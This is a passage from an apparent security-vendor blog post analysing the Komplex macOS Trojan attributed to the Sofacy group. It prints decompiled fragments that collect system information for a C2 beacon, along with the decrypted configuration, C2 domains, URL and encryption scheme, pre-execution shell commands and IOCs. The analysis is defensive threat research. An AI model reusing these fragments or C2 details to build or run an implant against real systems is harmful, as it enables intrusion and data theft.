						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a5549560011110-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-e">connectedToInternet</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5549560011110-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">[</span><span class="crayon-e">NSData </span><span class="crayon-v">dataWithContentsOfURL</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-e">NSURL </span></div><div class="crayon-line" id="crayon-60a9b5c8a5549560011110-3"><span class="crayon-v">URLWithString</span><span class="crayon-o">:</span><span class="crayon-sy">@</span><span class="crayon-s">"http://www.google.com"</span><span class="crayon-sy">]</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5549560011110-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5549560011110-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5549560011110-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60a9b5c8a5549560011110-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x0</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5549560011110-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60a9b5c8a5549560011110-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">var_1</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-cn">0xff</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5549560011110-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">rax</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a5549560011110-11"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>7</em><em> The connectedToInternet function testing for an active Internet connection</em></p>
<p style="text-align: left;">After confirming an active Internet connection, the Komplex payload begins carrying out its main functionality. The Komplex payload uses an 11-byte XOR algorithm to decrypt strings used for configuration and within C2 communications, including the C2 domains themselves. Figure 8 shows a screenshot of Komplex’s custom string decryption algorithm, along with the XOR key used to decrypt strings within the payload.</p>
<p style="text-align: left;"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_2.png" rel="wpdevart_lightbox"><img class="size-large wp-image-19700 aligncenter" src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_2-500x345.png" alt="sofacy_2" width="500" height="345" /></a></p>
<p style="text-align: center;"><em>Figure </em><em>8</em><em> 11-byte XOR algorithm used by Komplex to decrypt configuration strings</em></p>
<p>The algorithm seen in Figure 8 decrypts the strings seen in Table 1, which the payload references using the associated variable names. The payload uses these decrypted strings for a variety of purposes, such as command parsing and C2 server locations.</p>
<hr />
<table>
<tbody>
<tr>
<td width="96"><strong>Variable Name</strong></td>
<td width="288"><strong>Decrypted String</strong></td>
</tr>
<tr>
<td width="96">FILE_NAME</td>
<td width="288">FileName</td>
</tr>
<tr>
<td width="96">PATHTOSAVE</td>
<td width="288">PathToSave</td>
</tr>
<tr>
<td width="96">START_BLOCK_FILE</td>
<td width="288">[file]</td>
</tr>
<tr>
<td width="96">BLOCK_EXECUTE</td>
<td width="288">Execute</td>
</tr>
<tr>
<td width="96">BLOCK_DELETE</td>
<td width="288">Delete</td>
</tr>
<tr>
<td width="96">END_BLOCK_FILE</td>
<td width="288">[/file]</td>
</tr>
<tr>
<td width="96">SERVERS</td>
<td width="288">appleupdate[.]org, apple-iclouds[.]net, itunes-helper[.]net</td>
</tr>
<tr>
<td width="96">MAC</td>
<td width="288">mac</td>
</tr>
<tr>
<td width="96">CONFIG</td>
<td width="288">config</td>
</tr>
<tr>
<td width="96">GET_CONFIG</td>
<td width="288">1</td>
</tr>
<tr>
<td width="96">FILES</td>
<td width="288">file</td>
</tr>
<tr>
<td width="96">LOG</td>
<td width="288">log</td>
</tr>
<tr>
<td width="96">OLD_CONFIG</td>
<td width="288">2</td>
</tr>
<tr>
<td width="96">ID</td>
<td width="288">id</td>
</tr>
<tr>
<td width="96">TOKEN</td>
<td width="288">h8sn3vq6kl</td>
</tr>
<tr>
<td width="96">EXTENSIONS</td>
<td width="288">.xml .pdf, .htm, .zip</td>
</tr>
</tbody>
</table>
<hr />
<p style="text-align: center;"><em>Table </em><em>1</em><em> Strings decrypted by Komplex and their referenced name</em></p>
<p>The Komplex payload uses the SERVERS variable to obtain the location of its C2, which it communicates with using HTTP POST requests. The payload generates a URL to communicate with its C2 server that has the following structure:</p>
<p>/&lt;random path&gt;/&lt;random string&gt;.&lt;chosen extension&gt;/?&lt;random string&gt;=&lt;encrypted token&gt;</p>
<p>The &lt;chosen extension&gt; portion of the URL is chosen at random from the list of legitimate file extensions: .xml, .zip, .htm and .pdf. The &lt;encrypted token&gt; within the parameters of the URL is base64 encoded ciphertext created from the string ‘h8sn3vq6kl’. The ciphertext of the string is generated via a custom algorithm that uses a random 4-byte integer as a key that is modified by XOR with the static value 0xE150722. The payload also encrypts the data sent within the POST request using the same algorithm and encodes it using base64. Figure 9 below shows an example HTTP POST sent from the payload to its C2 server.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_3.png" rel="wpdevart_lightbox"><img class="size-large wp-image-19697 aligncenter" src="http://blog.paloaltonetworks.com/wp-content/uploads/2016/09/Sofacy_3-500x406.png" alt="sofacy_3" width="500" height="406" /></a></p>
<p style="text-align: center;"><em>Figure </em><em>9</em><em> Beacon sent from Komplex to C2 containing system information within the HTTP POST data</em></p>
<p>The HTTP POST data in Figure 9 is comprised of information that the malware collects from the infected system. The system information sent to the C2 includes data such as the system version, username, and process list, which is gathered within a function named “getOsInfo” within the “InfoOS” class (Figure 10).</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a554e042491121" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
int InfoOS::getOsInfo()() {
    var_38 = rdi;
    var_18 = [[NSProcessInfo processInfo] operatingSystemVersionString];
    var_20 = NSUserName();
    var_28 = InfoOS::getProcessList();
    var_30 = operator new[](strlen(var_28) + 0x200);
    sprintf(var_30, "Mac OS X - %s %s\nUser name - %s\n\t\t\t\t\t\tProcess 
list :\n\n%s", [var_18 UTF8String], InfoOS::bitOS(), [var_20 UTF8String], 
var_28);
    rax = var_30;
    return rax;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a554e042491121-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a554e042491121-2">2</div><div class="crayon-num" data-line="crayon-60a9b5c8a554e042491121-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a554e042491121-4">4</div><div class="crayon-num" data-line="crayon-60a9b5c8a554e042491121-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a554e042491121-6">6</div><div class="crayon-num" data-line="crayon-60a9b5c8a554e042491121-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a554e042491121-8">8</div><div class="crayon-num" data-line="crayon-60a9b5c8a554e042491121-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a554e042491121-10">10</div><div class="crayon-num" data-line="crayon-60a9b5c8a554e042491121-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a554e042491121-12">12</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a554e042491121-1"><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">InfoOS</span><span class="crayon-o">::</span><span class="crayon-e">getOsInfo</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a554e042491121-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_38</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">rdi</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a554e042491121-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_18</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-sy">[</span><span class="crayon-e">NSProcessInfo </span><span class="crayon-v">processInfo</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-v">operatingSystemVersionString</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a554e042491121-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_20</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">NSUserName</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a554e042491121-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_28</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">InfoOS</span><span class="crayon-o">::</span><span class="crayon-e">getProcessList</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a554e042491121-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">var_30</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">operator </span><span class="crayon-r">new</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-v">var_28</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">0x200</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a554e042491121-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">sprintf</span><span class="crayon-sy">(</span><span class="crayon-v">var_30</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"Mac OS X - %s %s\nUser name - %s\n\t\t\t\t\t\tProcess </span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a554e042491121-8"><span class="crayon-s">list :\n\n%s"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">var_18 </span><span class="crayon-v">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">InfoOS</span><span class="crayon-o">::</span><span class="crayon-e">bitOS</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">var_20 </span><span class="crayon-v">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-60a9b5c8a554e042491121-9"><span class="crayon-v">var_28</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a554e042491121-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">rax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">var_30</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60a9b5c8a554e042491121-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">rax</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a554e042491121-12"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>10</em><em> getOsInfo function within Komplex that gathers system information for C2 beacon</em></p>
<p>The Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the same custom algorithm used to encrypt the POST data. The Komplex payload will parse the C2 response for the following strings: "[file]" and "[/file]", "FileName=", "PathToSave=", "Shell=", "Execute", and "Delete". The "Delete" action does nothing more than delete a file specified by 'PathToSave'/'FileName', whereas the "Execute" action involves running the following system commands before executing the specified file:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b5c8a5554491968982" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
mkdir -p &amp;lt;'PathToSave'&amp;gt; &amp;amp;&amp;gt; /dev/null
chmod 755 &amp;lt;'PathToSave'&amp;gt;/&amp;lt;'FileName'&amp;gt; &amp;amp;&amp;gt; /dev/null</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b5c8a5554491968982-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b5c8a5554491968982-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b5c8a5554491968982-1"><span class="crayon-v">mkdir</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">p</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-s">'PathToSave'</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b5c8a5554491968982-2"><span class="crayon-i">chmod</span><span class="crayon-h"> </span><span class="crayon-cn">755</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-s">'PathToSave'</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-o">/</span><span class="crayon-o">&amp;</span><span class="crayon-v">lt</span><span class="crayon-sy">;</span><span class="crayon-s">'FileName'</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">amp</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">dev</span><span class="crayon-o">/</span><span class="crayon-t">null</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The payload will treat "[file]" and "[/file]" as delimiters that specify the data that the payload should write to a specified file, which allows the threat actor to download additional files to the system. Lastly, the payload can execute commands on the compromised system specified within the "Shell" field, which the payload will execute and then send results back to the C2.</p>
<h3>Connections to Sofacy and Previous Attacks.</h3>
<p><strong>Code Overlaps</strong></p>
<p>While reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth exploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog titled <a href="http://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html" target="_blank">NEW MAC OS MALWARE EXPLOITS MACKEEPER.</a> According to this blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable names and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network traffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data, command parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.</p>
<p>The second code overlap ties the Komplex Trojan to Sofacy’s Carberp variant, which we have analyzed in <a href="http://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/" target="_blank">previous research efforts</a>. Even though Komplex was created to run on OS X and Sofacy’s Carberp variant was developed to run on Windows, they share many commonalities, including:</p>
<ul>
<li>Same URL generation logic using random path values, a random file extension and encrypted token</li>
<li>Same file extensions used in C2 URL that are listed within the binaries in the same order</li>
<li>Same algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is modified using value 0xAA7D756 whereas Komplex uses 0xE150722)</li>
<li>Very similar command handling, including parsing specifically for Execute, Delete, [file], [/file], FileName, and PathToSave.</li>
<li>Checks for Internet connectivity by connecting to google.com</li>
<li>Uses an 11-byte XOR key to decrypt strings within the configuration</li>
</ul>
<p>In addition to these common traits, we found a Sofacy Carberp variant (SHA256: 638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the same TOKEN value of ‘h8sn3vq6kl’ within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the author of Sofacy’s Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the C2 server application to handle cross-platform implants.</p>
<p><strong>Infrastructure Overlap</strong></p>
<p>While Komplex’s C2 domain appleupdate[.]org does not appear to have any previously known activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a <a href="http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf" target="_blank">PwC Tactical Intelligence Bulletin</a> that discussed a phishing campaign conducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in Trend Micro’s blog titled <a href="http://blog.trendmicro.com/trendlabs-security-intelligence/looking-into-a-cyber-attack-facilitator-in-the-netherlands/" target="_blank">Looking Into a Cyber-Attack Facilitator in the Netherlands</a> that included research on hosting providers used by Pawn Storm (Sofacy).</p>
<p>The domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256: da43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload SHA256: 45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54), which used the IP address 185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the connection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.</p>
<h3>Conclusion</h3>
<p>The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy’s Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.</p>
<p>While Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:</p>
<ul>
<li>WildFire correctly identifies known Komplex executables as malicious</li>
<li>IPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan.</li>
<li>Customers can track this Trojan via the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Komplex" target="_blank">Komplex</a> tag in AutoFocus.</li>
</ul>
<h3>IOCs:</h3>
<p><strong>Hashes:<br />
</strong>2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134<br />
c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7<br />
cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4<br />
96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3<br />
227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5<br />
45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54</p>
<p><strong>C2 Locations:<br />
</strong>appleupdate[.]org<br />
apple-iclouds[.]net<br />
itunes-helper[.]net<br />
185.10.58.170</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" name="emailFormMask" value="">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>


        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
